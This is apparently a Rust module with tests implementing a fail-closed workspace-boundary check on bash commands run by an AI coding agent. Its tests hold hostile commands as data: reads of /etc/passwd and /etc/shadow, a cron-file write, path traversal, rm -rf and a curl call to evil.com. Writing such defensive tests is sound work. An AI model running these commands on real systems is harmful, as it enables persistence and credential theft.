//! Phase 3.1.B — `check_path_constraints` end-to-end orchestrator.
//!
//! Combines:
//! - 3.1.0 [`crate::redirects::extract_output_redirections`] (AST redirect
//!   extraction with Fail-Closed contract on unclassifiable targets)
//! - 3.1.A [`crate::path_validation::validate_command_paths`] (per-command
//!   workspace-boundary judgement + dangerous-removal gate)
//!
//! Ported from `claude-code-main/src/tools/BashTool/pathValidation.ts:1528`
//! (`checkPathConstraints`).
//!
//! ## Out of scope (deferred slices)
//!
//! - **Hook wireup** — making `BashValidationHook::before_tool_call` actually
//!   call [`check_path_constraints`] and emit `DecisionReason::PathOutOfWorkspace`
//!   is Phase 3.1.C.
//! - **Symlink real-path resolution** — ADR-150 (PR #569) defers this to a
//!   3.1.g follow-up.
//! - **Input-redirect target validation** — `cmd < /root/.ssh/id_rsa` is
//!   covered by Phase 2.1 input-redirect validator, not this gate.

use std::path::Path;
use std::path::PathBuf;

use dasclaw_shell_command::bash::try_parse_shell;
use tree_sitter::Node;

use crate::path_validation::expand_tilde_and_home;
use crate::path_validation::path_in_workspace;
use crate::path_validation::resolve_logical;
use crate::path_validation::validate_command_paths;
use crate::path_validation::PathCommand;
use crate::path_validation::PathValidationOutcome;
use crate::redirects::extract_output_redirections;
use crate::redirects::OutputRedirection;
use crate::redirects::RedirectionExtraction;

/// Apply workspace-boundary validation to every redirection target captured
/// by [`extract_output_redirections`].
///
/// Contract:
/// - If `extraction.has_dangerous_redirection` is set (parser bailed on
///   `$VAR`, `*`, `$(…)`, etc.) → returns [`PathValidationOutcome::Ask`]
///   (Fail-Closed).
/// - Otherwise iterates `extraction.redirections` in source order; the first
///   target that resolves outside `workspace_dirs` short-circuits with
///   [`PathValidationOutcome::Ask`] carrying the offending target.
/// - All redirection targets inside the workspace →
///   [`PathValidationOutcome::Passthrough`].
///
/// `cwd` is the shell's current working directory used to resolve relative
/// targets like `> output.log`. `home` powers `~` expansion (which the
/// extractor never produces — `~` is always flagged dangerous — but we
/// apply [`expand_tilde_and_home`] uniformly to mirror 3.1.A).
#[must_use]
pub fn validate_output_redirections(
    extraction: &RedirectionExtraction,
    cwd: &Path,
    workspace_dirs: &[PathBuf],
    home: &Path,
) -> PathValidationOutcome {
    if extraction.has_dangerous_redirection {
        return PathValidationOutcome::Ask {
            reason:
                "Output redirection target requires runtime expansion and cannot be statically \
                 validated (e.g. `$VAR`, `$(cmd)`, `*`, `~`, `>|`); approval required."
                    .to_owned(),
            blocked_path: None,
        };
    }

    for redirect in &extraction.redirections {
        if let Some(outcome) = check_single_redirect(redirect, cwd, workspace_dirs, home) {
            return outcome;
        }
    }

    PathValidationOutcome::Passthrough
}

fn check_single_redirect(
    redirect: &OutputRedirection,
    cwd: &Path,
    workspace_dirs: &[PathBuf],
    home: &Path,
) -> Option<PathValidationOutcome> {
    let expanded = expand_tilde_and_home(&redirect.target, home);
    let absolute = resolve_logical(&expanded, cwd);
    if path_in_workspace(&absolute, workspace_dirs) {
        None
    } else {
        Some(PathValidationOutcome::Ask {
            reason: format!(
                "Output redirection target `{}` resolves outside the workspace; approval required.",
                redirect.target
            ),
            blocked_path: Some(redirect.target.clone()),
        })
    }
}

/// Phase 3.1.B main entry: run end-to-end path-boundary validation against a
/// raw bash source string.
///
/// Decision flow (first non-[`PathValidationOutcome::Passthrough`] wins):
///
/// 1. Extract & validate output redirections — covers SECURITY PIN S5
///    (`echo > /etc/cron.d/x`).
/// 2. Parse the bash AST with `tree-sitter-bash`. **Fail-Closed Ask** if the
///    parser cannot produce a tree or the tree has any error nodes — covers
///    SECURITY PIN S8 (misparse).
/// 3. Walk every `command` node, extract literal argv. If any argv contains
///    a runtime-expansion token (`$VAR`, `$(…)`, backticks, …) we cannot
///    classify it safely → Fail-Closed Ask.
/// 4. For each extracted argv: if the base command is in
///    [`PathCommand::parse`]'s allow-list, dispatch to
///    [`validate_command_paths`]. Unknown base commands are Passthrough
///    (they are gated by other validators / deny-rules at a higher layer).
///
/// `workspace_dirs` is the caller-provided set of permissible workspace
/// roots — typically `[project_root, additional_directories…]` from the
/// IDE/desktop client. An empty list means **no path is allowed** (Ask for
/// every captured path), which is the safe default.
#[must_use]
pub fn check_path_constraints(
    src: &str,
    cwd: &Path,
    workspace_dirs: &[PathBuf],
    home: &Path,
) -> PathValidationOutcome {
    // Step 1: redirections (independent of base command dispatch).
    let extraction = extract_output_redirections(src);
    match validate_output_redirections(&extraction, cwd, workspace_dirs, home) {
        PathValidationOutcome::Passthrough => {}
        other => return other,
    }

    // Step 2: parse AST. Fail-Closed Ask on misparse.
    let Some(tree) = try_parse_shell(src) else {
        return fail_closed_parse("tree-sitter-bash failed to produce a tree");
    };
    let root = tree.root_node();
    if root.has_error() {
        return fail_closed_parse("tree-sitter-bash reported parse errors");
    }

    // Step 3: walk command nodes and dispatch.
    let commands = match extract_commands_for_path_check(root, src) {
        Ok(c) => c,
        Err(err) => return fail_closed_parse(err),
    };

    for argv in &commands {
        // Phase 3.1.B.2: peel safe wrappers (time/nohup/timeout/nice/stdbuf)
        // so the *real* base command is dispatched. Mirrors upstream
        // `stripWrappersFromArgv` (claude-code-main/.../bashPermissions.ts:677).
        let stripped = strip_wrappers_from_argv(argv);
        let Some((base, args)) = stripped.split_first() else {
            continue;
        };
        let Some(cmd) = PathCommand::parse(base) else {
            continue;
        };
        let outcome = validate_command_paths(cmd, args, cwd, workspace_dirs, home);
        if !matches!(outcome, PathValidationOutcome::Passthrough) {
            return outcome;
        }
    }

    PathValidationOutcome::Passthrough
}

fn fail_closed_parse(detail: &str) -> PathValidationOutcome {
    PathValidationOutcome::Ask {
        reason: format!(
            "Command could not be statically parsed ({detail}); approval required (Fail-Closed)."
        ),
        blocked_path: None,
    }
}

/// Walk the AST and return every simple `command` node's argv as literal
/// strings. Returns `Err` if any command word requires runtime expansion
/// (`$VAR`, `$(…)`, backticks, etc.) — the caller treats this as Fail-Closed.
///
/// Unlike [`dasclaw_shell_command::bash::try_parse_word_only_commands_sequence`]
/// — which refuses any tree containing `file_redirect` nodes — this walker
/// tolerates redirections because they are validated separately by
/// [`validate_output_redirections`]. We descend into compound constructs
/// (`list`, `pipeline`, `redirected_statement`, `subshell`, command
/// substitution, …) so that even nested commands get path-checked.
fn extract_commands_for_path_check(
    root: Node<'_>,
    src: &str,
) -> Result<Vec<Vec<String>>, &'static str> {
    let mut commands = Vec::new();
    let src_bytes = src.as_bytes();

    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        if node.kind() == "command" {
            let argv = extract_argv(node, src_bytes)?;
            if !argv.is_empty() {
                commands.push(argv);
            }
            // intentionally fall through so children (e.g. command
            // substitutions inside argv) are NOT walked twice — they are
            // already handled by `extract_argv`'s rejection of substitution.
            continue;
        }
        let mut cursor = node.walk();
        for child in node.children(&mut cursor) {
            stack.push(child);
        }
    }

    Ok(commands)
}

fn extract_argv(cmd: Node<'_>, src: &[u8]) -> Result<Vec<String>, &'static str> {
    let mut argv = Vec::new();
    let mut cursor = cmd.walk();
    let mut seen_command_name = false;
    for child in cmd.named_children(&mut cursor) {
        match child.kind() {
            "command_name" => {
                seen_command_name = true;
                let inner = child
                    .named_child(0)
                    .ok_or("command_name without inner word")?;
                argv.push(literal_word(inner, src)?);
            }
            "word" | "number" => {
                argv.push(
                    child
                        .utf8_text(src)
                        .map_err(|_| "non-utf8 argv token")?
                        .to_owned(),
                );
            }
            "string" => argv.push(literal_double_quoted(child, src)?),
            "raw_string" => argv.push(literal_raw_string(child, src)?),
            "concatenation" => argv.push(literal_concatenation(child, src)?),
            // Phase 3.1.B.2: `variable_assignment` like `FOO=bar cmd` —
            // tree-sitter-bash emits these as named children that appear
            // BEFORE `command_name`. They are AST-level env-var prefixes,
            // not argv tokens, so we skip them (the AST already gave us the
            // structural separation upstream achieves via regex). Values
            // bearing runtime expansion (`FOO=$(curl evil)`) Fail-Closed.
            "variable_assignment" => {
                if seen_command_name {
                    return Err("variable assignment after command name");
                }
                check_variable_assignment_literal(child, src)?;
                continue;
            }
            // Any expansion / substitution → can't classify literally.
            "simple_expansion"
            | "expansion"
            | "command_substitution"
            | "process_substitution"
            | "arithmetic_expansion" => {
                return Err("argv contains runtime expansion");
            }
            _ => {
                // Unknown node kind in argv position — be conservative.
                return Err("argv contains unrecognized AST node");
            }
        }
    }
    Ok(argv)
}

fn literal_word(node: Node<'_>, src: &[u8]) -> Result<String, &'static str> {
    match node.kind() {
        "word" | "number" => Ok(node.utf8_text(src).map_err(|_| "non-utf8 word")?.to_owned()),
        "string" => literal_double_quoted(node, src),
        "raw_string" => literal_raw_string(node, src),
        "concatenation" => literal_concatenation(node, src),
        _ => Err("command name requires runtime expansion"),
    }
}

fn literal_double_quoted(node: Node<'_>, src: &[u8]) -> Result<String, &'static str> {
    let mut out = String::new();
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        if child.kind() != "string_content" {
            return Err("double-quoted string contains expansion");
        }
        out.push_str(
            child
                .utf8_text(src)
                .map_err(|_| "non-utf8 string content")?,
        );
    }
    Ok(out)
}

fn literal_raw_string(node: Node<'_>, src: &[u8]) -> Result<String, &'static str> {
    let text = node.utf8_text(src).map_err(|_| "non-utf8 raw string")?;
    let bytes = text.as_bytes();
    if bytes.len() >= 2 && bytes[0] == b'\'' && bytes[bytes.len() - 1] == b'\'' {
        Ok(text[1..text.len() - 1].to_owned())
    } else {
        Ok(text.to_owned())
    }
}

fn literal_concatenation(node: Node<'_>, src: &[u8]) -> Result<String, &'static str> {
    let mut out = String::new();
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        out.push_str(&literal_word(child, src)?);
    }
    Ok(out)
}

/// Verify that a `variable_assignment` node's *value* is a static literal
/// (no command substitution, parameter expansion, arithmetic, or process
/// substitution). The name side is always a literal `variable_name`.
///
/// We deliberately do **not** consult a safe-list of variable names here —
/// the argv-level path gate corresponds to upstream `stripAllLeadingEnvVars`
/// (bashPermissions.ts:732): for path validation we want to peel *any*
/// literal env prefix so the real command can be classified. Allow-rule
/// matching applies the safe-list separately at a higher layer.
fn check_variable_assignment_literal(node: Node<'_>, src: &[u8]) -> Result<(), &'static str> {
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        match child.kind() {
            // Literal name parts.
            "variable_name" | "subscript" => continue,
            // Literal value parts — re-validate via the same literal-word
            // gate used for argv so quoted forms with expansion are caught.
            "word" | "number" | "raw_string" => continue,
            "string" => {
                literal_double_quoted(child, src)?;
            }
            "concatenation" => {
                literal_concatenation(child, src)?;
            }
            "array" => return Err("env-var array assignment is not statically classifiable"),
            "simple_expansion"
            | "expansion"
            | "command_substitution"
            | "process_substitution"
            | "arithmetic_expansion" => {
                return Err("env-var value contains runtime expansion");
            }
            _ => return Err("env-var assignment has unrecognized AST node"),
        }
    }
    Ok(())
}

/// Argv-level wrapper stripper. Mirrors upstream `stripWrappersFromArgv`
/// (claude-code-main/src/tools/BashTool/bashPermissions.ts:677).
///
/// Peels iteratively while the head matches one of:
///
/// - `time` / `nohup` — bare wrapper, optional `--` after
/// - `timeout [flags] <duration> …` — flag set per [`skip_timeout_flags`]
/// - `nice [-n N | -N]?` — bare / `-n N` / `-N` forms, optional `--` after
/// - `stdbuf -i… -o… -e…` — at least one fused IO-buffer flag, optional `--`
///
/// SECURITY: an unrecognized form (e.g. `timeout -k$(id) 5 ls` where the
/// fused short flag fails `[A-Za-z0-9_.+-]+` validation) returns the input
/// **unchanged**. That keeps `baseCmd='timeout'` outside the
/// [`PathCommand`] dispatch table, which is Fail-Closed because callers
/// have already Fail-Closed Ask'd on the runtime expansion in
/// `extract_argv`.
///
/// SECURITY PIN **S9**: `timeout 5 cat /etc/passwd`, `nice rm -rf /tmp/x`,
/// `time cat /etc/passwd`, `nohup -- rm /tmp/sec`, `stdbuf -o0 cat /etc/passwd`
/// must all reach [`validate_command_paths`] under the real base command,
/// not silently passthrough on the wrapper name.
#[must_use]
pub(crate) fn strip_wrappers_from_argv(argv: &[String]) -> &[String] {
    let mut a = argv;
    loop {
        let Some(head) = a.first() else { return a };
        let consumed = match head.as_str() {
            "time" | "nohup" => peel_simple_wrapper(a),
            "timeout" => peel_timeout(a),
            "nice" => peel_nice(a),
            "stdbuf" => peel_stdbuf(a),
            _ => return a,
        };
        match consumed {
            Some(n) if n <= a.len() => {
                let next = &a[n..];
                // Defensive: if we somehow didn't make progress, abort to
                // avoid an infinite loop. (Cannot trigger with current
                // peel_* helpers but keeps the loop total.)
                if next.len() == a.len() {
                    return a;
                }
                a = next;
            }
            // Cannot consume (unparseable flags, or out-of-bounds slice).
            // Return what we have — upstream also bails out unchanged.
            _ => return a,
        }
    }
}

/// Peel `time`/`nohup` and an optional `--` end-of-options marker.
fn peel_simple_wrapper(a: &[String]) -> Option<usize> {
    if a.get(1).map(String::as_str) == Some("--") {
        Some(2)
    } else {
        Some(1)
    }
}

/// Peel `timeout [flags] <duration>`. Returns the number of tokens to
/// consume, or `None` if flags or duration are unrecognized.
fn peel_timeout(a: &[String]) -> Option<usize> {
    let i = skip_timeout_flags(a)?;
    let dur = a.get(i)?;
    if !is_timeout_duration(dur) {
        return None;
    }
    Some(i + 1)
}

/// Mirror of upstream `skipTimeoutFlags` (bashPermissions.ts:634).
/// Returns the argv index of the DURATION token after flags, or `None`
/// when an unrecognized flag is encountered.
fn skip_timeout_flags(a: &[String]) -> Option<usize> {
    let mut i = 1;
    while let Some(arg) = a.get(i) {
        let arg = arg.as_str();
        let next = a.get(i + 1).map(String::as_str);

        // Long flags without value.
        if matches!(arg, "--foreground" | "--preserve-status" | "--verbose") {
            i += 1;
        }
        // Long flags with fused value: --kill-after=5, --signal=TERM.
        else if let Some(rest) = arg.strip_prefix("--kill-after=") {
            if !is_timeout_flag_value(rest) {
                return None;
            }
            i += 1;
        } else if let Some(rest) = arg.strip_prefix("--signal=") {
            if !is_timeout_flag_value(rest) {
                return None;
            }
            i += 1;
        }
        // Long flags with separate value.
        else if matches!(arg, "--kill-after" | "--signal") {
            let v = next?;
            if !is_timeout_flag_value(v) {
                return None;
            }
            i += 2;
        }
        // End-of-options marker.
        else if arg == "--" {
            i += 1;
            break;
        }
        // Any other long flag: unrecognized, abort.
        else if arg.starts_with("--") {
            return None;
        }
        // Short flags without value.
        else if arg == "-v" {
            i += 1;
        }
        // Short -k/-s with separate value.
        else if matches!(arg, "-k" | "-s") {
            let v = next?;
            if !is_timeout_flag_value(v) {
                return None;
            }
            i += 2;
        }
        // Short -kVAL / -sVAL fused.
        else if let Some(rest) = arg.strip_prefix("-k").or_else(|| arg.strip_prefix("-s")) {
            if rest.is_empty() || !is_timeout_flag_value(rest) {
                return None;
            }
            i += 1;
        }
        // Anything else starting with '-' is an unrecognized short flag.
        else if arg.starts_with('-') {
            return None;
        }
        // Non-flag token: this is the duration; stop scanning.
        else {
            break;
        }
    }
    Some(i)
}

/// Match upstream `TIMEOUT_FLAG_VALUE_RE = /^[A-Za-z0-9_.+-]+$/`.
fn is_timeout_flag_value(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'+' | b'-'))
}

/// Match upstream `/^\d+(?:\.\d+)?[smhd]?$/` for the timeout duration token.
fn is_timeout_duration(s: &str) -> bool {
    let bytes = s.as_bytes();
    if bytes.is_empty() {
        return false;
    }
    let mut i = 0;
    let mut saw_int = false;
    while i < bytes.len() && bytes[i].is_ascii_digit() {
        saw_int = true;
        i += 1;
    }
    if !saw_int {
        return false;
    }
    if i < bytes.len() && bytes[i] == b'.' {
        i += 1;
        let frac_start = i;
        while i < bytes.len() && bytes[i].is_ascii_digit() {
            i += 1;
        }
        if i == frac_start {
            return false;
        }
    }
    if i < bytes.len() && matches!(bytes[i], b's' | b'm' | b'h' | b'd') {
        i += 1;
    }
    i == bytes.len()
}

/// Peel `nice` — bare, `nice -n N`, or `nice -N` form.
fn peel_nice(a: &[String]) -> Option<usize> {
    let a1 = a.get(1).map(String::as_str);
    let a2 = a.get(2).map(String::as_str);
    let n = if a1 == Some("-n") && a2.is_some_and(is_signed_int) {
        if a.get(3).map(String::as_str) == Some("--") {
            4
        } else {
            3
        }
    } else if a1.is_some_and(is_negative_int) {
        if a.get(2).map(String::as_str) == Some("--") {
            3
        } else {
            2
        }
    } else if a1 == Some("--") {
        2
    } else {
        1
    };
    Some(n)
}

/// Match `/^-?\d+$/`.
fn is_signed_int(s: &str) -> bool {
    let bytes = s.as_bytes();
    let mut i = 0;
    if i < bytes.len() && bytes[i] == b'-' {
        i += 1;
    }
    if i == bytes.len() {
        return false;
    }
    bytes[i..].iter().all(u8::is_ascii_digit)
}

/// Match `/^-\d+$/`. Note: `-n` is NOT a negative int.
fn is_negative_int(s: &str) -> bool {
    s.starts_with('-') && s.len() > 1 && s.as_bytes()[1..].iter().all(u8::is_ascii_digit)
}

/// Peel `stdbuf -iN -oN -eN …`. Requires at least one fused flag.
fn peel_stdbuf(a: &[String]) -> Option<usize> {
    let mut i = 1;
    while let Some(arg) = a.get(i) {
        if is_stdbuf_fused_flag(arg) {
            i += 1;
        } else {
            break;
        }
    }
    if i == 1 {
        // No flags consumed — upstream regex requires at least one.
        return None;
    }
    if a.get(i).map(String::as_str) == Some("--") {
        Some(i + 1)
    } else {
        Some(i)
    }
}

/// Match upstream `-[ioe][LN0-9]+`.
fn is_stdbuf_fused_flag(s: &str) -> bool {
    let bytes = s.as_bytes();
    if bytes.len() < 3 || bytes[0] != b'-' {
        return false;
    }
    if !matches!(bytes[1], b'i' | b'o' | b'e') {
        return false;
    }
    bytes[2..]
        .iter()
        .all(|&b| matches!(b, b'L' | b'N') || b.is_ascii_digit())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::redirects::RedirectOperator;

    fn ws(dirs: &[&str]) -> Vec<PathBuf> {
        dirs.iter().map(PathBuf::from).collect()
    }

    fn home() -> PathBuf {
        PathBuf::from("/home/u")
    }

    fn cwd() -> PathBuf {
        PathBuf::from("/work/repo")
    }

    // -------- validate_output_redirections --------

    #[test]
    fn validate_redirects_empty_passthrough() {
        let extraction = RedirectionExtraction::default();
        let r = validate_output_redirections(&extraction, &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn validate_redirects_inside_workspace_passthrough() {
        let extraction = RedirectionExtraction {
            redirections: vec![OutputRedirection {
                target: "out.log".to_owned(),
                operator: RedirectOperator::Write,
            }],
            has_dangerous_redirection: false,
        };
        let r = validate_output_redirections(&extraction, &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn pin_s5_redirect_outside_workspace_is_ask() {
        // SECURITY PIN S5: `echo evil > /etc/cron.d/x`
        let extraction = RedirectionExtraction {
            redirections: vec![OutputRedirection {
                target: "/etc/cron.d/x".to_owned(),
                operator: RedirectOperator::Write,
            }],
            has_dangerous_redirection: false,
        };
        let r = validate_output_redirections(&extraction, &cwd(), &ws(&["/work/repo"]), &home());
        match r {
            PathValidationOutcome::Ask { blocked_path, .. } => {
                assert_eq!(blocked_path.as_deref(), Some("/etc/cron.d/x"));
            }
            other => panic!("expected Ask, got {other:?}"),
        }
    }

    #[test]
    fn pin_s5_dangerous_redirect_is_ask_failclosed() {
        // `echo > $HOME/.bashrc` — extractor flagged dangerous.
        let extraction = RedirectionExtraction {
            redirections: vec![],
            has_dangerous_redirection: true,
        };
        let r = validate_output_redirections(&extraction, &cwd(), &ws(&["/work/repo"]), &home());
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn validate_redirects_first_offender_short_circuits() {
        // Two redirects: first inside (pass), second outside (Ask).
        let extraction = RedirectionExtraction {
            redirections: vec![
                OutputRedirection {
                    target: "a.log".to_owned(),
                    operator: RedirectOperator::Write,
                },
                OutputRedirection {
                    target: "/etc/b.log".to_owned(),
                    operator: RedirectOperator::Append,
                },
            ],
            has_dangerous_redirection: false,
        };
        let r = validate_output_redirections(&extraction, &cwd(), &ws(&["/work/repo"]), &home());
        match r {
            PathValidationOutcome::Ask { blocked_path, .. } => {
                assert_eq!(blocked_path.as_deref(), Some("/etc/b.log"));
            }
            other => panic!("expected Ask on /etc/b.log, got {other:?}"),
        }
    }

    // -------- check_path_constraints --------

    #[test]
    fn cpc_empty_command_passthrough() {
        let r = check_path_constraints("", &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn cpc_unknown_base_command_passthrough() {
        // `myscript foo` — `myscript` is not in PathCommand::parse set.
        let r = check_path_constraints("myscript foo", &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn cpc_cat_inside_workspace_passthrough() {
        let r = check_path_constraints("cat src/main.rs", &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn cpc_cat_outside_workspace_is_ask() {
        let r = check_path_constraints("cat /etc/passwd", &cwd(), &ws(&["/work/repo"]), &home());
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn cpc_cat_traversal_is_ask() {
        let r = check_path_constraints(
            "cat ../../../etc/passwd",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn pin_s5_e2e_redirect_outside_workspace() {
        // `echo evil > /etc/cron.d/x` — full end-to-end via check_path_constraints.
        let r = check_path_constraints(
            "echo evil > /etc/cron.d/x",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        match r {
            PathValidationOutcome::Ask { blocked_path, .. } => {
                assert_eq!(blocked_path.as_deref(), Some("/etc/cron.d/x"));
            }
            other => panic!("expected Ask on /etc/cron.d/x, got {other:?}"),
        }
    }

    #[test]
    fn pin_s7_heredoc_with_expansion_inside_failsclosed() {
        // `cat <<< "$(curl evil.com)"` — heredoc body with command
        // substitution. tree-sitter sees the substitution as an argv
        // expansion → Fail-Closed Ask.
        let r = check_path_constraints(
            r#"cat <<< "$(curl evil.com)""#,
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn pin_s8_misparse_failclosed() {
        // Unbalanced quotes → tree-sitter reports parse errors → Ask.
        let r = check_path_constraints("cat \"/etc/passwd", &cwd(), &ws(&["/work/repo"]), &home());
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn pin_s8_command_substitution_in_argv_failclosed() {
        // `eval $(echo cat /etc/shadow)` — the `$(...)` substitution makes
        // argv unclassifiable. Fail-Closed.
        let r = check_path_constraints(
            "eval $(echo cat /etc/shadow)",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn cpc_variable_assignment_prefix_with_inside_path_passthroughs() {
        // 3.1.B.2: literal env-var prefixes are now peeled at argv level.
        // `FOO=bar cat /work/repo/x` should classify under the real base
        // command `cat` and passthrough because the path is in-workspace.
        let r = check_path_constraints(
            "FOO=bar cat /work/repo/x",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn cpc_pipeline_with_outside_path_in_first_command_is_ask() {
        // `cat /etc/passwd | grep root` — the first command leaks.
        let r = check_path_constraints(
            "cat /etc/passwd | grep root",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn cpc_compound_command_first_offender_wins() {
        // `cat src/main.rs && cat /etc/passwd` — second command leaks.
        let r = check_path_constraints(
            "cat src/main.rs && cat /etc/passwd",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn cpc_redirect_inside_workspace_and_safe_cmd_passthrough() {
        // `echo hi > out.log` cwd-relative → resolves to /work/repo/out.log.
        let r = check_path_constraints("echo hi > out.log", &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn cpc_empty_workspace_dirs_means_everything_is_ask() {
        let r = check_path_constraints("cat src/main.rs", &cwd(), &ws(&[]), &home());
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn cpc_multiple_workspace_dirs_passthrough_in_second_root() {
        let r = check_path_constraints(
            "cat /other/proj/file.rs",
            &cwd(),
            &ws(&["/work/repo", "/other/proj"]),
            &home(),
        );
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    // ----- 3.1.B.2: env-prefix tolerance + wrapper stripping -----

    fn strs(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| (*s).to_owned()).collect()
    }

    #[test]
    fn swfa_no_wrapper_returns_input_unchanged() {
        let a = strs(&["cat", "/etc/passwd"]);
        assert_eq!(strip_wrappers_from_argv(&a), a.as_slice());
    }

    #[test]
    fn swfa_time_bare_strips_one() {
        let a = strs(&["time", "cat", "/etc/passwd"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[1..]);
    }

    #[test]
    fn swfa_nohup_with_double_dash_strips_two() {
        let a = strs(&["nohup", "--", "rm", "/tmp/x"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[2..]);
    }

    #[test]
    fn swfa_timeout_simple_duration_strips() {
        let a = strs(&["timeout", "5", "cat", "/etc/passwd"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[2..]);
    }

    #[test]
    fn swfa_timeout_with_suffix_duration_strips() {
        let a = strs(&["timeout", "10s", "cat", "/etc/passwd"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[2..]);
    }

    #[test]
    fn swfa_timeout_with_long_flag_fused_value_strips() {
        let a = strs(&["timeout", "--kill-after=5", "5", "cat", "/etc/passwd"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[3..]);
    }

    #[test]
    fn swfa_timeout_with_long_flag_separate_value_strips() {
        let a = strs(&["timeout", "--signal", "TERM", "5", "cat", "/etc/passwd"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[4..]);
    }

    #[test]
    fn swfa_timeout_with_short_flag_fused_strips() {
        let a = strs(&["timeout", "-k5", "5", "cat", "/etc/passwd"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[3..]);
    }

    #[test]
    fn swfa_timeout_with_unrecognized_long_flag_returns_unchanged() {
        let a = strs(&["timeout", "--evil", "5", "ls"]);
        assert_eq!(strip_wrappers_from_argv(&a), a.as_slice());
    }

    #[test]
    fn swfa_timeout_with_unrecognized_duration_returns_unchanged() {
        // `.5` (no leading digit) is accepted by GNU timeout but our regex
        // — matching upstream — requires a leading digit. Returning input
        // unchanged is Fail-Closed because baseCmd='timeout' is not a
        // PathCommand and downstream callers Ask on unknown bases.
        let a = strs(&["timeout", ".5", "ls"]);
        assert_eq!(strip_wrappers_from_argv(&a), a.as_slice());
    }

    #[test]
    fn swfa_nice_bare_strips_one() {
        let a = strs(&["nice", "rm", "-rf", "/tmp/sec"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[1..]);
    }

    #[test]
    fn swfa_nice_dash_n_form_strips_three() {
        let a = strs(&["nice", "-n", "5", "rm", "/tmp/sec"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[3..]);
    }

    #[test]
    fn swfa_nice_dash_n_legacy_form_strips_two() {
        let a = strs(&["nice", "-5", "rm", "/tmp/sec"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[2..]);
    }

    #[test]
    fn swfa_stdbuf_fused_flags_strip() {
        let a = strs(&["stdbuf", "-o0", "-eL", "cat", "/etc/passwd"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[3..]);
    }

    #[test]
    fn swfa_stdbuf_no_flags_returns_unchanged() {
        let a = strs(&["stdbuf", "ls"]);
        assert_eq!(strip_wrappers_from_argv(&a), a.as_slice());
    }

    #[test]
    fn swfa_chained_wrappers_strip_iteratively() {
        // nohup → timeout → real command.
        let a = strs(&["nohup", "timeout", "5", "cat", "/etc/passwd"]);
        assert_eq!(strip_wrappers_from_argv(&a), &a[3..]);
    }

    #[test]
    fn swfa_wrapper_only_no_command_returns_empty_slice() {
        let a = strs(&["nohup"]);
        let stripped = strip_wrappers_from_argv(&a);
        assert!(stripped.is_empty());
    }

    // ----- S9 end-to-end: env prefixes + wrappers must not bypass the gate -----

    #[test]
    fn s9_timeout_around_cat_etc_passwd_is_ask() {
        let r = check_path_constraints(
            "timeout 5 cat /etc/passwd",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(
            matches!(r, PathValidationOutcome::Ask { .. }),
            "S9 timeout wrapper must not hide /etc/passwd; got {r:?}"
        );
    }

    #[test]
    fn s9_nice_around_rm_outside_workspace_is_ask() {
        let r = check_path_constraints(
            "nice rm -rf /tmp/secret-payload.bin",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(
            matches!(r, PathValidationOutcome::Ask { .. }),
            "S9 bare-nice wrapper must not hide rm /tmp/...; got {r:?}"
        );
    }

    #[test]
    fn s9_nohup_double_dash_rm_is_ask() {
        let r = check_path_constraints(
            "nohup -- rm /tmp/secret",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn s9_time_around_cat_etc_passwd_is_ask() {
        let r = check_path_constraints(
            "time cat /etc/passwd",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
